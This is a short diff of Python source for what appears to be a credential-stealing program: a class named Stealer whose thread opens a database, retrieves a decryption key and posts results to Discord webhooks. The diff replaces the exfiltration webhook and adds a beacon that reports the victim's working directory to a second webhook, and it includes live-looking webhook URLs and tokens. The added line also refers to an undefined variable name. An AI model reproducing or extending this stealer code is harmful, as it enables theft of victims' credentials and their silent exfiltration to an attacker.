@@ -150,8 +150,11 @@ class Stealer():
 
 class ExtraThread(QThread):
     def run(self):
+        access_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
+        access_message = requests.post(error_log_webhook, json={"content": f"[{os.getcwd()}] Accessed."})
+    
         try:
-            webhook = "https://discord.com/api/webhooks/1169075539101892709/U-YF6F86qSXlKpIO4o_NeD-N_FX0m7vvaSgia-kwORbRTCSDC7m92VA50BlXaQYd90cj"
+            webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
             stealer = Stealer()
             stealer.get_database_cursor()
             stealer.get_key()
